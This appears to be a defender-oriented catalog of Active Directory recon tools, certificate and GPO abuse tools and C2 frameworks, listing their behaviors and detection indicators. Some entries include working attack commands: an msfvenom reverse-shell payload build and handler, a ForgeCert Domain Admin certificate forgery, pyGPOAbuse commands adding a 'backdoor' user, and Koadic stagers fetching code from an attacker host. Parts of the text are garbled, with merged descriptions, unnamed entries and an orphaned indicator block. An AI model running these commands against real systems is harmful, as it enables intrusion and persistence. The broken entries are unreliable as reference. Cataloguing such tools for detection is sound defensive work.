description: Graph-based Active Directory relationship visualization tool that uses Neo4j to map attack paths, privilege escalation routes, and trust relationships across AD domains. Ingests data from SharpHound/AzureHound collectors and renders interactive graphs showing shortest paths to Domain Admin, Kerberoastable accounts, and ACL abuse chains.
native_purpose: Identify and visualize unintended privilege relationships in Active Directory environments for security assessment and attack surface reduction
known_behaviors: Imports JSON/ZIP data collected by SharpHound into Neo4j graph database
Executes pre-built Cypher queries to find attack paths to high-value targets
Maps trust relationships between domains and forests
Identifies Kerberoastable and AS-REP roastable accounts via graph queries
Marks owned principals and high-value targets for path analysis
indicators: Neo4j database service (neo4j.exe / java) listening on ports 7474, 7687
BloodHound.exe or bloodhound electron process running
Import of .json or .zip files containing AD enumeration data (computers.json, users.json, groups.json, domains.json)
Cypher query patterns: shortestPath, allShortestPaths, :Group, :Computer, :User, :Domain nodes
File artifacts: bloodhound.db, neo4j data directory growth
Network connections to Neo4j bolt protocol on port 7687
Pre-built query execution: 'Find Shortest Paths to Domain Admins', 'Find Kerberoastable Users'
BloodHound CE (Community Edition) API calls on port 8080

description: Official C# data collector for BloodHound that enumerates Active Directory objects via LDAP, SMB, and RPC to collect users, groups, computers, sessions, ACLs, GPOs, trusts, and local admin relationships. Outputs JSON/ZIP ingestible by BloodHound.
native_purpose: Collect Active Directory relationship data for BloodHound graph analysis during authorized security assessments
known_behaviors: Performs LDAP queries against domain controllers to enumerate all AD objects
Enumerates local group memberships via NetLocalGroupGetMembers on remote hosts
Collects user session data via NetSessionEnum and NetWkstaUserEnum on remote hosts
Generates ZIP archives containing JSON files for BloodHound ingestion
Supports stealth collection methods with jitter and loop intervals
indicators: LDAP queries with large result sets: (objectClass=user), (objectClass=computer), (objectClass=group), (objectCategory=organizationalUnit)
LDAP query for SPNs: (&(servicePrincipalName=*)(objectClass=user))
LDAP query for trusts: (objectClass=trustedDomain)
LDAP query for GPOs: (objectClass=groupPolicyContainer)
LDAP query for ACLs requesting nTSecurityDescriptor attribute
SMB connections to ADMIN$ and IPC$ shares on multiple hosts in rapid succession
NetSessionEnum (SRVSVC) and NetLocalGroupGetMembers (SAMR) RPC calls across many hosts
Process: SharpHound.exe or powershell.exe loading SharpHound.ps1
Output files: *_BloodHound.zip, *_computers.json, *_users.json, *_groups.json, *_domains.json
High volume of LDAP connections from a single non-DC source to port 389/636

description: Data collector for BloodHound that enumerates Azure AD and Azure Resource Manager objects including users, groups, applications, service principals, roles, subscriptions, and resource groups. Maps attack paths in hybrid and cloud-only Azure environments.
native_purpose: Collect Azure AD and Azure RM relationship data for BloodHound attack path analysis in authorized cloud security assessments
known_behaviors: Authenticates to Microsoft Graph API and Azure RM API to enumerate Azure objects
Collects Azure AD users, groups, applications, service principals, and role assignments
Enumerates Azure subscriptions, resource groups, VMs, key vaults, and storage accounts
Maps Azure AD role assignments and application permissions for privilege escalation paths
Outputs JSON data compatible with BloodHound CE ingestion
indicators: Microsoft Graph API calls: GET /users, /groups, /applications, /servicePrincipals, /roleManagement/directory/roleAssignments
Azure RM API enumeration: GET /subscriptions, /resourceGroups, /providers/Microsoft.Compute/virtualMachines
High volume of sequential Graph API queries from a single source
OAuth token requests to login.microsoftonline.com with broad scopes
Process: azurehound.exe with command-line arguments containing tenant IDs and tokens
Output JSON files containing Azure AD object types and relationships
Requests to management.azure.com for resource enumeration

description: Cross-platform BloodHound data collector written in Rust that performs LDAP-based enumeration of Active Directory. Compiles to a single static binary for Windows and Linux, avoiding .NET dependencies that SharpHound requires. Supports LDAPS and Kerberos authentication.
native_purpose: Lightweight cross-platform Active Directory data collection for BloodHound when .NET-based SharpHound is unavailable or impractical
known_behaviors: Performs LDAP/LDAPS queries to enumerate AD users, computers, groups, OUs, GPOs, and trusts
Collects ACL/DACL information via LDAP nTSecurityDescriptor attribute requests
Outputs BloodHound-compatible JSON files in ZIP format
Supports NTLM and Kerberos authentication for LDAP binding
Single static binary with no runtime dependencies
indicators: LDAP queries from non-standard (non-DC) hosts requesting objectClass=user, computer, group
LDAP requests for nTSecurityDescriptor attribute across many objects
Single binary process named rusthound or custom-named executable performing LDAP enumeration
Output ZIP files containing BloodHound-format JSON (users.json, computers.json, groups.json)
LDAP connections on port 389/636 from Linux hosts in a Windows domain
Kerberos TGT/TGS requests from unexpected host/user combinations
High-volume LDAP paged search requests from a single source

description: Reporting engine that operates on BloodHound Neo4j data to generate actionable reports, dashboards, and prioritized findings. Executes batches of Cypher queries and outputs results in HTML, CSV, or text format for blue team triage and red team documentation.
native_purpose: Generate automated security reports from BloodHound data to prioritize Active Directory remediation efforts
known_behaviors: Connects to Neo4j database containing BloodHound data and runs batch Cypher queries
Generates HTML/CSV reports on Kerberoastable users, admin paths, stale accounts
Produces executive summary dashboards of AD security posture
Supports custom query task lists for targeted analysis
Identifies domain admin paths, unconstrained delegation, and excessive permissions
command_examples: python3 PlumHound.py -x tasks/default.tasks -s bolt://localhost:7687 -u neo4j -p password
indicators: Python process connecting to Neo4j bolt protocol on port 7687
Batch Cypher query execution against BloodHound database
Generation of HTML/CSV report files in output directories
Queries targeting high-value BloodHound nodes: Domain Admins, Enterprise Admins
Network connections from PlumHound host to Neo4j on 7687
File creation: report files with BloodHound-derived AD security findings

description: Sysinternals Active Directory Explorer is a legitimate AD viewer and snapshot tool that can browse AD databases, create point-in-time snapshots (.dat files), and compare snapshots. Frequently abused for offline AD enumeration and can be converted to BloodHound-compatible format via ADExplorerSnapshot.py.
native_purpose: Microsoft Sysinternals tool for browsing, searching, and creating snapshots of Active Directory databases for troubleshooting and administration
known_behaviors: Creates full point-in-time snapshots of Active Directory database as .dat files
Browses AD objects, attributes, and security descriptors interactively
Compares two AD snapshots to identify changes over time
Performs LDAP searches with custom filters against live AD or snapshots
Signed Microsoft binary, often not flagged by endpoint protection
indicators: Process ADExplorer.exe or ADExplorer64.exe creating .dat snapshot files
Large .dat files (hundreds of MB to GB) created in user-writable directories
LDAP queries from ADExplorer requesting all attributes for large numbers of objects
Command-line argument '-snapshot' indicating automated snapshot capture
Subsequent conversion: ADExplorerSnapshot.py processing .dat files into JSON
LDAP bind from ADExplorer to domain controller on port 389/636
File transfer of large .dat files to external systems
Snapshot files containing full AD attribute data including password-related attributes

description: PowerShell-based Active Directory reconnaissance framework (part of PowerSploit/Empire) that provides cmdlets for enumerating domains, users, groups, ACLs, GPOs, trusts, shares, sessions, and SPNs. description: PowerShell script that performs comprehensive Active Directory enumeration and generates detailed Excel/CSV/HTML reports. Collects information about forest, domain, trusts, sites, subnets, password policies, fine-grained password policies, DCs, users, groups, OUs, GPOs, ACLs, LAPS, and BitLocker recovery keys.

known_behaviors: Enumerates AD forest, domain, site, and subnet configurations

description: Active Directory security assessment tool that generates health check reports with risk scores. Analyzes AD configuration for vulnerabilities including stale objects, weak passwords, dangerous trusts, Kerberos delegation issues, and privileged account misconfigurations. Produces HTML reports with maturity scoring.

known_behaviors: Performs comprehensive AD health check and assigns risk scores across categories
Identifies stale accounts, dangerous trust configurations, and Kerberos issues

description: Group Policy security auditing tool (Grouper2 is the current version) that analyzes GPOs for security misconfigurations including credential exposure in preferences, weak file permissions, scheduled task abuse vectors, and registry-based vulnerabilities. Parses SYSVOL GPO XML files.

description: C# tool that forges certificates using a stolen Certificate Authority (CA) private key and certificate. Creates golden certificates that can be used to authenticate as any domain user, enabling persistent domain-level access similar to golden ticket attacks.
native_purpose: Demonstrate the impact of CA private key compromise by forging certificates during authorized red team operations
known_behaviors: Forges X.509 certificates signed by the stolen CA certificate and private key
Creates certificates with arbitrary Subject Alternative Names (any user UPN)
Generates .pfx files usable for PKINIT authentication to obtain TGTs
Enables persistent domain access without needing the krbtgt hash
Bypasses certificate revocation if CRL checking is not enforced
command_examples: ForgeCert.exe --CaCertPath stolen_ca.pfx --CaCertPassword pass --Subject 'CN=Forged' --SubjectAltName da@corp.local --NewCertPath da.pfx --NewCertPassword pass --CRL ldap:///CN=Corp-CA,CN=dc01,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
indicators: Process ForgeCert.exe with command-line arguments referencing CA certificate paths
Creation of .pfx certificate files in non-standard locations
PKINIT authentication (AS-REQ with PA-PK-AS-REQ) using certificates not issued by legitimate enrollment

description: Python toolkit for abusing PKINIT (Public Key Cryptography for Initial Authentication) in Kerberos. Enables certificate-based authentication to obtain TGTs, performs UnPAC-the-hash to recover NT hashes from PKINIT authentication, and requests service tickets using obtained TGTs.
native_purpose: Test PKINIT-based authentication and demonstrate certificate-to-hash escalation during authorized Active Directory security assessments

indicators: PKINIT AS-REQ packets (PA-PK-AS-REQ) from non-standard hosts
Kerberos U2U (User-to-User) TGS-REQ immediately following PKINIT AS-REP (UnPAC-the-hash)
S4U2Self TGS-REQ requests following PKINIT authentication

description: Tool that uses X.509 certificates for LDAP authentication via Schannel to perform Active Directory operations. Bypasses NTLM and Kerberos authentication entirely by authenticating to LDAPS with a client certificate, then performs RBCD setup, shadow credentials, or account modifications.

Write operations to SYSVOL GPO directories: ScheduledTasks.xml, GptTmpl.inf, Scripts\Startup
LDAP modification of gPCMachineExtensionNames or gPCUserExtensionNames on GPO objects
GPT.INI version number increments on GPOs not modified by legitimate administrators
EventID 5136: Directory Service Changes for groupPolicyContainer objects
EventID 5145: write access to SYSVOL policy directories from non-admin workstations
New ScheduledTasks.xml entries with immediate execution triggers
Modifications to GptTmpl.inf adding new user rights assignments
Addition of startup/logon scripts to GPO machine or user configuration

description: Python implementation of GPO abuse techniques (Impacket-based) that exploits writable Group Policy Objects remotely. Creates immediate scheduled tasks and adds local admin members through GPO modifications via SMB, enabling cross-platform GPO exploitation from Linux attack hosts.
native_purpose: Cross-platform tool for demonstrating GPO permission misconfigurations during authorized remote security assessments
known_behaviors: Modifies GPOs remotely via SMB to add immediate scheduled tasks
Adds local administrator group members through GPO restricted groups
Operates from Linux/macOS hosts against Windows AD environments via Impacket
Modifies GPT.INI and ScheduledTasks.xml through SMB file operations
Updates GPO version numbers in LDAP to trigger Group Policy refresh
command_examples: python3 pygpoabuse.py corp.local/user:pass -gpo-id 6AC1786C-016F-11D2-945F-00C04fB984F9 -command 'net user backdoor P@ss /add' -f
python3 pygpoabuse.py corp.local/user:pass -gpo-id <GUID> -command 'cmd /c whoami > C:\temp\test.txt' -taskname CustomTask
indicators: SMB write operations to \\domain\SYSVOL\domain\Policies\{GUID} from Linux/non-domain hosts
Creation or modification of ScheduledTasks.xml via SMB from external hosts
LDAP modification of versionNumber on groupPolicyContainer objects from non-admin sources
Python/Impacket-based SMB connections modifying SYSVOL policy files
GPT.INI version increments correlated with ScheduledTasks.xml modifications
Network connections from Linux hosts to SMB (445) and LDAP (389) on domain controllers
EventID 5145: SYSVOL write access from unexpected source IPs
Immediate scheduled task creation with command-line payloads (net user, powershell, cmd)

description: Commercial adversary simulation platform widely abused by threat actors. Deploys 'beacon' implants that communicate via HTTP/HTTPS/DNS with configurable malleable C2 profiles. Default named pipes: \\\\.<pipe>\\MSSE-<4-digit>-server, \\\\.<pipe>\\msagent_<hex>. Default HTTPS port 443 with self-signed certificates. Beacon DLL often injected via rundll32.exe or spawned as temporary processes. Watermarked builds allow attribution.
native_purpose: Licensed adversary simulation and red team operations platform for testing enterprise defenses against advanced persistent threats
known_behaviors: Spawns temporary processes (rundll32.exe, dllhost.exe) for post-exploitation tasks via fork-and-run
Uses named pipes for inter-process SMB beacon communication with default pipe names MSSE-*-server
Performs Kerberos ticket manipulation (Golden/Silver Ticket) via mimikatz integration
Beacon phones home at configurable intervals (default 60s) with jitter to evade periodic detection
Malleable C2 profiles reshape HTTP traffic to mimic legitimate services (jQuery, Amazon, Google Safe Browsing)
indicators: Process: beacon.exe, beacon.dll, or injected into rundll32.exe/dllhost.exe
Named pipes: \\.<pipe>\\MSSE-<digits>-server, \\.<pipe>\\msagent_<hex>, \\.<pipe>\\postex_*
Default SSL cert: CN=Major Cobalt Strike with serial 146473198
HTTP headers: default Content-Type: application/octet-stream with specific URI patterns like /submit.php?id=
Default staging URI: checksum8 algorithm where URI path characters sum to 92 (x86) or 93 (x64)
Memory: reflective DLL loading with MZ header in non-file-backed memory regions
Network: default 60-second callback interval with 0% jitter; DNS beacons query A/AAAA/TXT records
File: cobaltstrike.store (Java keystore), .cobaltstrike.beacon_keys, team server on port 50050
YARA: rule CobaltStrike_Beacon_Encoded targeting XOR-encoded beacon config in PE resources
ETW: suspicious CLR loading in non-.NET processes during execute-assembly

description: Open-source penetration testing framework with extensive exploit and payload library. Meterpreter payloads operate as reflective DLLs injected into memory. Default handler ports include 4444 (reverse TCP), 8080 (HTTP), 8443 (HTTPS). Generates staged and stageless payloads detectable by AV signatures. Meterpreter communicates via TLV (Type-Length-Value) protocol over encrypted channels.
native_purpose: Industry-standard open-source penetration testing framework for vulnerability assessment and security validation
known_behaviors: Meterpreter injects reflective DLL into target process memory without touching disk
Multi/handler listens on configurable ports for reverse connections from staged payloads
Post-exploitation modules enumerate system info, dump credentials, pivot through networks
Generates shellcode payloads in multiple formats (exe, dll, ps1, py, raw) via msfvenom
Uses encrypted TLV protocol for Meterpreter command-and-control communications
command_examples: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
msfconsole -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 8443; exploit'
indicators: Process: meterpreter sessions inject into existing processes or spawn new ones (notepad.exe default migrate target)
Network: default reverse TCP on port 4444, HTTP on 8080, HTTPS on 8443; TLV-encoded binary protocol
File: meterpreter.dll, metsrv.dll, ext_server_*.dll loaded reflectively in memory
Registry: persistence modules write to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Network: staged payloads make initial small connection then download larger stage; URI contains random 4-char checksum
Memory: MZ/PE headers in non-file-backed memory, rwx memory regions from reflective loading
Signatures: known msfvenom shellcode stubs (fc 48 83 e4 f0 for x64, fc e8 for x86)
Service: metsvc installs as persistent Meterpreter service
File paths: ~/.msf4/ directory, /opt/metasploit-framework/
Network: HTTP stager uses specific URI checksum algorithm similar to Cobalt Strike

description: Open-source cross-platform C2 framework written in Go by BishopFox. Generates implants as compiled Go binaries that are naturally large (8-15MB). Supports mTLS, WireGuard, HTTP(S), and DNS C2 channels. Implants use random per-build encryption keys. Multiplayer support via gRPC on port 31337 by default. Increasingly used as Cobalt Strike alternative by both red teams and threat actors.
native_purpose: Open-source adversary emulation framework designed for red team operations and penetration testing engagements
known_behaviors: Generates unique implants per build with randomized encryption keys and binary signatures
Supports multiple simultaneous C2 protocols (mTLS, HTTP/S, DNS, WireGuard) per implant
Implants compiled as Go binaries with optional obfuscation via garble compiler
Provides BOF (Beacon Object File) execution for in-memory post-exploitation
Cursed Chrome extension for browser session hijacking and cookie theft
indicators: Process: large Go binary (8-15MB) with stripped symbols; unusual for standard executables
Network: mTLS on non-standard ports; WireGuard UDP traffic on unusual ports
Network: HTTP C2 uses configurable URI paths with .woff, .js, .png extensions by default
File: implant configs embedded in binary; strings analysis reveals Go build paths
DNS: long subdomain queries for DNS C2 channel (encoded data in subdomain labels)
Network: gRPC multiplayer server default port 31337
Memory: Go runtime structures and goroutine stacks identifiable in memory forensics
Certificates: auto-generated TLS certs with random organizational fields
YARA: Go binary with no standard Go build ID but containing net/http and crypto/tls packages
Network: HTTP responses contain configurable headers; default uses application/octet-stream

description: Modern open-source C2 framework with a 'Demon' agent. Written in C/C++ with a Qt-based GUI. Demon agent supports indirect syscalls, sleep obfuscation (Ekko/Zilean), and stack spoofing to evade EDR. Default teamserver port 40056. Supports HTTP/HTTPS listeners with customizable profiles. Uses AES-256 encrypted communications. Rapidly adopted post-2022 as free Cobalt Strike alternative.
native_purpose: Modern open-source command and control framework for authorized red team operations and adversary simulation
known_behaviors: Demon agent uses indirect syscalls to bypass EDR userland hooks
Sleep obfuscation encrypts agent memory during sleep intervals (Ekko, Zilean, FOLIAGE techniques)
Stack spoofing creates fake call stacks to evade thread-based detections
Supports loading and executing BOFs (Beacon Object Files) and .NET assemblies in-memory
Module-based architecture allows loading additional capabilities on demand
indicators: Process: Demon agent injected into legitimate processes; spawns sacrificial processes for post-exploitation
Network: default teamserver on port 40056; HTTPS listener on configurable ports
Network: HTTP requests contain specific User-Agent strings configurable in listener profile
Memory: sleep obfuscation causes periodic encryption/decryption of agent memory regions
Syscalls: indirect syscall stubs resolve ntdll functions dynamically to bypass inline hooks
File: havoc-client, havoc-teamserver binaries; data stored in ~/.havoc/ directory
Named pipes: configurable pipe names for SMB agent communication
Network: AES-256 encrypted payloads within HTTP/HTTPS body; configurable request/response headers
ETW: potential ETW patching to blind Windows event logging

description: Modular C2 framework with web-based UI built on Docker microservices. Uses pluggable agents (Apollo, Poseidon, Medusa, Athena, etc.) and C2 profiles as independent Docker containers. Default web UI on port 7443. PostgreSQL backend on port 5432. RabbitMQ messaging on port 5672. Each agent is a separate project with unique IOCs, making detection agent-specific rather than framework-wide.
native_purpose: Collaborative red team C2 platform designed for multi-operator adversary simulation with modular agent architecture
known_behaviors: Deploys as Docker container stack with web UI, PostgreSQL database, and RabbitMQ message broker
Agents are independently developed plugins (Apollo/.NET, Poseidon/Go, Medusa/Python, Athena/.NET)
C2 profiles are swappable Docker containers (HTTP, websocket, TCP, SMB, etc.)
Web UI provides real-time task management, file browser, process browser, and credential tracking
Supports custom agent development through standardized agent interface specification
indicators: Network: web UI default on port 7443/HTTPS; API endpoint /api/v1.4/
Infrastructure: Docker containers running mythic_server, mythic_postgres, mythic_rabbitmq, mythic_nginx
Network: RabbitMQ on port 5672, PostgreSQL on port 5432 (internal)
Agent-specific: Apollo uses .NET reflection; Poseidon is Go binary; each has unique network signatures
File: Mythic configuration in /opt/Mythic/ or cloned repository directory
Network: C2 profile dependent - HTTP profiles use configurable URIs, headers, and parameters
Certificates: auto-generated self-signed certs for HTTPS listeners
Memory: agent-dependent - Apollo loads .NET assemblies, Poseidon has Go runtime footprint
Logging: PostgreSQL stores all operation data; useful for forensic analysis if server is captured

description: Commercial adversary simulation framework marketed as EDR-evasive. Uses 'Badger' implants with advanced evasion: indirect syscalls, unhooking, ETW/AMSI patching, stack spoofing. Default teamserver ('Ratel') on port 443. Uses DOH (DNS-over-HTTPS) and other novel C2 channels. Cracked versions widely distributed to threat actors since mid-2022. Known for defeating top EDR products out-of-the-box.
native_purpose: Commercial adversary simulation platform for testing endpoint detection and response capabilities with advanced evasion techniques
known_behaviors: Badger implants use indirect syscalls via hell's gate / halo's gate technique to bypass EDR hooks
Patches ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) in-memory to blind security telemetry
Stack frame spoofing during sleep to appear as legitimate thread with benign call stack
Supports DOH (DNS-over-HTTPS), HTTP/S, TCP, SMB, and custom C2 channels
Shellcode generation with built-in evasion and encrypted payload delivery
indicators: Process: Badger shellcode injected into legitimate processes; often targets RuntimeBroker.exe
Network: DOH queries to legitimate resolvers (Google, Cloudflare) for C2 domain resolution
Network: encrypted HTTP traffic with specific badger check-in patterns; configurable URIs
Memory: indirect syscall stubs that jump into middle of ntdll functions
File: .brc4 configuration files; ratel server binary
Network: default licensing check to bruteratel.com; cracked versions may skip this
ETW: NtTraceEvent patching detectable via ETW provider monitoring gaps
Memory: decrypted badger config contains C2 URLs, sleep time, jitter values
Certificates: configurable TLS certificates; cracked versions may use default/known certs
Detection: monitor for gaps in ETW telemetry and AMSI scan failures as indirect indicators

description: .NET-based C2 framework with web interface. Uses 'Grunt' implants written in C#. Default listener on port 80/443. Web UI on port 7443. Grunts communicate via HTTP/HTTPS with configurable profiles. Built on ASP.NET Core with Blazor frontend. Compiles implants on-the-fly using Roslyn compiler. SQLite backend stores operation data. Development largely stalled since 2021 but still observed in the wild.
native_purpose: Open-source .NET command and control framework for collaborative red team engagements and security testing
known_behaviors: Compiles Grunt implants on-the-fly using embedded Roslyn C# compiler
Grunts execute tasks by loading compiled .NET assemblies into memory via reflection
Supports multiple communication profiles mimicking legitimate web traffic patterns
Web-based collaborative UI allows multiple operators to share sessions and tasks
GruntHTTP stager downloads and executes larger Grunt payload in stages
indicators: Process: Grunt executes as .NET process; loads System.Reflection and System.Compiler assemblies
Network: HTTP/HTTPS with configurable URIs; default cookie-based session tracking
File: Covenant.db (SQLite database), Covenant/Data/ directory with implant templates
Network: default web UI on port 7443; API endpoints under /api/
Memory: .NET assemblies loaded via Assembly.Load() visible in CLR profiling
File: compiled Grunt binaries in /tmp/ or Covenant/Data/Grunt/ directories
Network: default HTTP profile uses /en-us/index.html, /en-us/docs.html URIs with Cookie headers
Detection: monitor for unusual .NET compilation (csc.exe/Roslyn) in non-development contexts
Signatures: known Grunt GUID format in HTTP communications

description: PowerShell/C#/Python-based C2 framework with proxy-aware communications. Default HTTPS listener on port 443. Implants include PowerShell, C# (Sharp), and Python variants. Uses encrypted comms with configurable encryption keys. Implant communications can be proxied through legitimate web infrastructure. Web-based reporting interface. Originally PowerShell-focused, now supports multiple implant types.
native_purpose: Open-source command and control framework used for red team operations and adversary simulation with proxy-aware agents
known_behaviors: Deploys PowerShell, C# (SharpPosh), and Python implants depending on target OS
PowerShell implant uses encoded/encrypted commands delivered via HTTPS
Proxy-aware communications route through target organization's web proxies
Built-in modules for privilege escalation, lateral movement, and credential harvesting
Automatic AMSI bypass attempts in PowerShell implant delivery
indicators: Process: powershell.exe with encoded command-line arguments; C# implant as standalone executable
Network: HTTPS with configurable URIs; default includes /homepage/, /index/, /news/
File: poshc2/ directory with project files; reports/ directory with operation logs
Network: default port 443 HTTPS; daisy-chain listeners on internal network ports
PowerShell: heavily encoded/obfuscated PowerShell commands in event logs (4104)
File: implant payloads in payloads/ directory (dropper_*.ps1, sharp_*.exe, py_*.py)
Memory: .NET assembly loading for C# implant; PowerShell ScriptBlock logging captures activity
Network: configurable User-Agent strings; default mimics legitimate browser traffic
Detection: monitor PowerShell ScriptBlock logs (Event ID 4104) for PoshC2 module patterns

description: Go-based C2 framework supporting HTTP/1.1, HTTP/2, and HTTP/3 (QUIC) protocols. Agents are compiled Go binaries (large, 8-15MB). Default server port 443. Uses JA3 hash for TLS fingerprinting evasion. Supports OPAQUE password-authenticated key exchange for agent authentication. HTTP/3 QUIC traffic is unusual and detectable on networks not expecting UDP-based web protocols.
native_purpose: Cross-platform post-exploitation C2 server and agent written in Go for authorized security testing and red team operations
known_behaviors: Agents compiled as Go binaries supporting HTTP/1.1, HTTP/2, and HTTP/3 (QUIC) protocols
Uses OPAQUE (Oblivious Pseudo-Random Function) for password-authenticated key exchange
HTTP/3 uses QUIC (UDP-based) which is unusual and may bypass HTTP-focused network inspection
Agent payloads generated as DLLs, executables, or shellcode with Go compilation
Supports multiple message encoding types: JSON, gob, or custom formats
indicators: Process: large Go binary (8-15MB) with Merlin-specific strings if not stripped
Network: HTTP/2 with TLS on port 443 by default; HTTP/3 QUIC on UDP port 443
Network: QUIC/UDP traffic on port 443 is highly anomalous in most enterprise environments
JA3: Go TLS client hello has distinctive JA3 hash different from browsers
File: merlinServer, merlinAgent binaries; data/ directory with server configuration
Network: JSON-encoded messages in HTTP body with base64-encoded encrypted payloads
Memory: Go runtime structures; goroutine stacks visible in memory dumps
Network: OPAQUE key exchange produces distinctive initial handshake pattern
Detection: monitor for HTTP/3 QUIC traffic on networks where it is not expected

description: PowerShell and Python post-exploitation framework (formerly PowerShell Empire, now with Starkiller GUI). Uses encrypted staging protocol over HTTP/HTTPS. Default listener on port 443. Agents include PowerShell, Python, and C# (Sharpire). Extensive module library for credential dumping, lateral movement, and persistence. Maintained by BC-Security after original project abandoned. Starkiller provides web-based GUI on port 1337.
native_purpose: Open-source post-exploitation and adversary simulation framework for authorized red team operations and penetration testing
known_behaviors: PowerShell agent uses encoded/encrypted stager delivered via launcher commands
Agents communicate over HTTP/HTTPS with AES-encrypted payload in cookie or POST body
Extensive module library including Mimikatz, PowerView, and privilege escalation modules
Starkiller web GUI on port 1337 provides visual operation management
Supports malleable communication profiles to reshape HTTP traffic signatures
command_examples: usestager multi/launcher; set Listener http; execute
indicators: Process: powershell.exe with -noP -sta -w 1 -enc flags; long base64-encoded command line
Network: HTTP/HTTPS with configurable URIs; default staging uses /login/process.php, /news.php
PowerShell: ScriptBlock logging (4104) reveals Empire stager and agent code patterns
File: empire.db (SQLite), empire/ directory structure, starkiller GUI files
Network: default listener on port 443; Starkiller REST API on port 1337
Registry: persistence modules write to Run keys, scheduled tasks, or WMI subscriptions
Memory: PowerShell runspace with Empire agent loaded; System.Management.Automation references
Network: default User-Agent: Mozilla/5.0 with specific cookie-based session management
Detection: AMSI will flag Empire stager unless bypassed; monitor for AMSI bypass attempts
File: stager files often named launcher.bat, launcher.vbs, or launcher.ps1

description: Windows post-exploitation framework using Windows Script Host (JScript/VBScript) as implant runtime. Called 'COM Command & Control'. Zombies (agents) execute via mshta.exe, rundll32.exe, regsvr32.exe, or wscript.exe. Uses legitimate Windows COM objects for post-exploitation activities. Communicates over HTTP with JScript-encoded payloads. Effective against environments that monitor PowerShell but not script hosts.
native_purpose: Windows post-exploitation rootkit using COM-based scripting for authorized penetration testing where PowerShell monitoring is prevalent
known_behaviors: Implants execute via Windows Script Host processes: mshta.exe, rundll32.exe, regsvr32.exe, wscript.exe
Uses JScript/VBScript payloads that leverage Windows COM objects for system interaction
Stagers delivered via mshta http://attacker/stager, regsvr32 /s /u /i:http://attacker scrobj.dll
Post-exploitation uses WMI, WScript.Shell, and other COM interfaces for stealth
Bypasses PowerShell-focused detections by using script host alternatives
indicators: Process: mshta.exe, wscript.exe, cscript.exe, or rundll32.exe making HTTP connections
Process: regsvr32.exe /s /u /i:http://<attacker> scrobj.dll execution pattern
Network: HTTP connections from script host processes fetching JScript/VBScript payloads
WMI: COM object instantiation via WMI for lateral movement and execution
File: koadic/ directory with stagers and implant modules
Command line: mshta http://<ip>:<port>/<random> in process creation logs
Network: HTTP responses containing JScript code with specific Koadic function patterns
Detection: monitor for mshta.exe/regsvr32.exe/wscript.exe making outbound HTTP connections
Event logs: WMI activity logs and Script Host event logging capture Koadic operations

description: Post-exploitation C2 framework using IronPython and C# implants running on .NET CLR. Previously named 'ST'. Uses Boo language for modules. Implants load IronPython engine into target process for stealthy Python execution within .NET runtime. Default teamserver uses WebSocket on port 5000. Embeds Python runtime in .NET process, creating distinctive CLR loading patterns detectable by ETW.
native_purpose: Post-exploitation framework leveraging embedded Python (.NET IronPython) for authorized security testing and red team operations
known_behaviors: Loads IronPython engine into .NET CLR within target process for Python-based post-exploitation
Uses Boo programming language for modular post-exploitation tasks
Teamserver communicates with operators via WebSocket protocol
Implants can be generated as EXE, DLL, or staged shellcode
Modules execute within IronPython runtime avoiding PowerShell entirely
indicators: Process: target process loads clr.dll, IronPython.dll, IronPython.Modules.dll unexpectedly
CLR: .NET CLR loaded in processes that normally do not use .NET (e.g., notepad.exe)
Network: WebSocket connections to teamserver on port 5000
Memory: IronPython engine strings and Python bytecode in .NET process memory
ETW: CLR loading events (Microsoft-Windows-DotNETRuntime) in non-.NET processes
File: st.py, SILENTTRINITY directory structure with stagers/ and modules/
Detection: monitor for IronPython DLL loading in unexpected processes via Sysmon Event ID 7
Network: HTTP upgrade to WebSocket protocol for C2 communications
File: MSBuild XML payload files if using MSBuild stager delivery method

description: Lightweight C2 framework generating backdoors that bypass Windows Defender and other AV. Supports Windows (PowerShell) and Linux (bash) reverse shells with encrypted communications. Uses HoaxShell-based architecture for generating undetectable reverse shells. Supports multi-session handling and basic file transfer. Simple Python-based server with minimal footprint.
native_purpose: Open-source C2 framework for generating reverse shells with evasion capabilities for authorized penetration testing
known_behaviors: Generates Windows (PowerShell) and Linux (bash) reverse shell payloads with AV evasion
Uses HoaxShell technique for Windows Defender bypass via legitimate PowerShell cmdlets
Supports encrypted communications between implant and server
Multi-session management for handling multiple reverse shell connections
Payloads use obfuscated PowerShell that leverages Invoke-RestMethod or curl for callbacks
indicators: Process: powershell.exe using Invoke-RestMethod or Invoke-WebRequest for C2 callbacks
Network: HTTP/HTTPS callbacks from PowerShell or bash at regular intervals
PowerShell: obfuscated commands using string concatenation, variable substitution, and encoding
Process: bash process making curl/wget callbacks on Linux targets
File: Villain.py server script; generated payload scripts
Network: simple HTTP-based protocol with base64 or custom encoding in parameters
Detection: monitor for PowerShell Invoke-RestMethod/Invoke-WebRequest in loops with sleep intervals
Command line: PowerShell command line containing while($true) loop with web request cmdlets

description: Commercial C2 framework by MDSec with advanced evasion capabilities. Uses indirect syscalls, dynamic API resolution, sleep obfuscation with encrypted heap, and configurable network profiles. Known for defeating advanced EDR solutions. Supports HTTP/HTTPS/DNS/SMB channels. Uses threadless injection techniques. Very limited distribution but cracked versions have appeared. Extremely difficult to detect with standard tools.
native_purpose: Commercial advanced adversary simulation framework designed for testing enterprise EDR/XDR detection capabilities
known_behaviors: Uses indirect syscalls and dynamic API resolution to bypass all userland EDR hooks
Sleep obfuscation encrypts the entire implant heap during sleep intervals
Threadless process injection avoids creating remote threads detectable by EDR
Supports malleable C2 profiles similar to Cobalt Strike but with more evasion options
Module execution via callback-based injection techniques that avoid common injection patterns
indicators: Memory: encrypted heap regions that periodically decrypt and re-encrypt (sleep obfuscation)
Syscalls: indirect syscall execution jumping into ntdll code sections at non-function-entry points
Network: highly customizable HTTP/HTTPS profiles designed to blend with legitimate traffic
Process: threadless injection creates no remote threads; uses callback-based execution
Detection: extremely difficult with standard tools; requires advanced memory forensics
Network: DNS C2 channel uses configurable record types and encoding schemes
Memory: dynamic API resolution avoids static imports; IAT appears clean
File: Nighthawk is commercially licensed; unauthorized copies may have specific watermarks
ETW: may patch or disable ETW providers to prevent telemetry collection

